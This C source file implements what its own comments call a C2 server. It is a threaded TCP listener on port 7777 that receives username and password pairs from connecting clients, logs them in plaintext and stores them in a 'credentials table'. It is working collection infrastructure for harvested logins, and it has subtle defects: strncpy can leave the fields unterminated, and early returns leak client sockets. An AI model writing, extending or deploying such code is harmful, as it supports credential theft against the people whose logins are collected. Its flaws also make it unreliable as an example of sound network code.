#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdarg.h>
#include <time.h>
#include "db.h"


// SERVER CONFIG
// ---------------------

#define PORT 7777
#define BUFFER_SIZE 512

int serverSocket = -1;
extern btree *always_loaded;


// LOGGING
// ---------------------

// Print timestamped message from C2 server
void printLog(const char *msg, ...) {
    printf("\33[2K\r");  // Clear current terminal line

    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char time_str[9];
    strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);

    va_list args;
    va_start(args, msg);
    printf("[c2] [%s] ", time_str);
    vprintf(msg, args);
    va_end(args);

    printf("\n> ");
    fflush(stdout);
}


// SHUTDOWN SERVER
// ---------------------

// Close the C2 socket gracefully
void stopServer() {
    if (serverSocket != -1) {
        close(serverSocket);
        printLog("[*] C2 server socket closed");
        serverSocket = -1;
    }
}


// HANDLE INCOMING CLIENT
// ---------------------

// Handle a single client connection and insert received data into always_loaded
void *handleClient(void *arg) {
    int clientSocket = *(int *)arg;
    free(arg);

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, sizeof(buffer));

    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived > 0) {
        buffer[bytesReceived] = '\0';
        printLog("[*] Received: %s", buffer);

        char *token = strtok(buffer, " ");  // Command keyword
        token = strtok(NULL, " ");          // Username
        if (!token) {
            printLog("[!] Missing username");
            return NULL;
        }
        char username[64];
        strncpy(username, token, sizeof(username) - 1);

        token = strtok(NULL, " ");          // Password
        if (!token) {
            printLog("[!] Missing password");
            return NULL;
        }
        char password[64];
        strncpy(password, token, sizeof(password) - 1);

        token = strtok(NULL, " ");
        if (token) {
            printLog("[!] Too many arguments");
            return NULL;
        }

        if (always_loaded == NULL) {
            printLog("[!] credentials table is NULL");
            return NULL;
        }

        int new_id = generateID(always_loaded);
        Rows row = createRow(new_id, username, password);
        insertKey(row, always_loaded);

        printLog("[+] Inserted into always_loaded: %s %s", username, password);
    } else {
        printLog("[!] Connection error or no data");
    }

    close(clientSocket);
    return NULL;
}


// START SERVER
// ---------------------

// Launch the TCP listener and accept incoming connections
void startServer() {
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        printLog("[!] Failed to create socket");
        exit(1);
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        printLog("[!] Bind failed");
        close(serverSocket);
        exit(1);
    }

    if (listen(serverSocket, 5) < 0) {
        printLog("[!] Listen failed");
        close(serverSocket);
        exit(1);
    }

    printLog("[*] C2 listener started on port %d", PORT);

    while (1) {
        struct sockaddr_in clientAddr;
        socklen_t clientLen = sizeof(clientAddr);
        int *clientSocket = malloc(sizeof(int));
        *clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &clientLen);

        if (*clientSocket < 0) {
            printLog("[!] Accept failed");
            free(clientSocket);
            continue;
        }

        pthread_t thread;
        if (pthread_create(&thread, NULL, handleClient, clientSocket) != 0) {
            printLog("[!] Thread creation failed");
            close(*clientSocket);
            free(clientSocket);
        } else {
            pthread_detach(thread);
        }
    }
}
